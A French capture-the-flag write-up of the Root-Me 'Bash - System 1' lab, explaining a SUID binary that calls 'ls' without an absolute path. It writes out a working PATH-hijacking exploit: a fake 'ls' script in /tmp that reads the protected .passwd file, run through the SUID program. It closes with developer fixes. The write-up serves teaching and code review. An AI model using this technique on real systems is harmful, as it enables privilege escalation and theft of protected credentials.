Bash - System 1 — App-Script — Facile

Plateforme : Root-Me  Date de résolution : 24/09/2026

Contexte

Le challenge fournit un accès SSH direct (identifiants donnés dans l'énoncé) ainsi que le code source d'un petit programme C. Le binaire compilé à partir de ce code est marqué comme appartenant à un autre utilisateur et possède le bit SUID activé. Le but est de lire un fichier .passwd appartenant à ce second utilisateur, normalement illisible avec les droits par défaut.

Code source fourni :

c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
Reconnaissance

Une fois connecté en SSH, j'ai listé le dossier personnel et vérifié les permissions des fichiers présents :

bash
ls -a
cat Makefile

Le Makefile a confirmé le schéma classique de ces challenges : le binaire compilé (ch11) et le fichier .passwd appartiennent à un compte "cracked" distinct, avec le bit SUID appliqué sur le binaire :

bash
chown $(USER_CRACKED):$(USER) $(BIN) .passwd Makefile $(SRC)
chmod 400 .passwd
chmod u+s $(BIN)

J'ai vérifié les permissions réelles du binaire :

bash
ls -la ch11
# -r-sr-x--- 1 app-script-ch11-cracked app-script-ch11 7252 ...

Le s à la place du x sur les droits du propriétaire confirme le bit SUID actif : le binaire s'exécute toujours avec les droits de app-script-ch11-cracked, quel que soit l'utilisateur qui le lance.

Découverte de la vulnérabilité

En relisant le code source, la ligne clé est :

c
system("ls /challenge/app-script/ch11/.passwd");

La commande ls est appelée sans son chemin absolu (/bin/ls). Or system() exécute la commande via un shell, qui va chercher ls en parcourant les dossiers listés dans la variable d'environnement $PATH, dans l'ordre.

Comme le binaire est SUID et tourne avec les droits de app-script-ch11-cracked, si je parviens à faire exécuter mon propre programme nommé ls à la place du véritable /bin/ls, ce faux programme s'exécutera lui aussi avec les droits élevés du compte cracked. Il suffit donc de placer un dossier contenant mon faux ls en tête du $PATH.

Exploitation
Création d'un dossier de travail et d'un faux binaire ls qui affiche le contenu du fichier .passwd :
bash
mkdir -p /tmp/monexploit
cd /tmp/monexploit
cat > ls << 'EOF'
#!/bin/bash
cat /challenge/app-script/ch11/.passwd
EOF
chmod +x ls
Modification du $PATH pour que mon dossier soit consulté avant les dossiers système :
bash
export PATH=/tmp/monexploit:$PATH
Retour dans le dossier personnel et exécution du binaire SUID :
bash
cd ~
./ch11

Le programme SUID exécute alors system("ls ..."), le shell interne trouve mon faux ls en premier dans le $PATH, et l'exécute avec les droits de app-script-ch11-cracked — révélant ainsi le contenu de .passwd.

Résultat

L'exécution a affiché directement le contenu du fichier .passwd, correspondant au mot de passe de validation du challenge. Le flag a été soumis sur la page Root-Me sans être republié ici, conformément aux règles de la plateforme.

Ce que j'ai appris

Ce challenge illustre un pattern très classique et encore rencontré en audit réel : un binaire SUID qui appelle une commande externe sans chemin absolu hérite implicitement de la confiance qu'il place dans le $PATH de l'utilisateur qui l'exécute. C'est une leçon directement réutilisable en pentest ou en revue de code : toujours vérifier comment un programme privilégié invoque ses sous-commandes (system(), popen(), exec*() avec un nom relatif), et systématiquement tester le détournement du $PATH face à un binaire SUID/SGID. La bonne pratique côté développeur est d'appeler les commandes externes avec leur chemin absolu (/bin/ls) ou de réinitialiser explicitement $PATH en début de programme.

Outils utilisés
SSH (client OpenSSH)
Bash (script du faux binaire ls)
ls -la / cat / stat (inspection des permissions)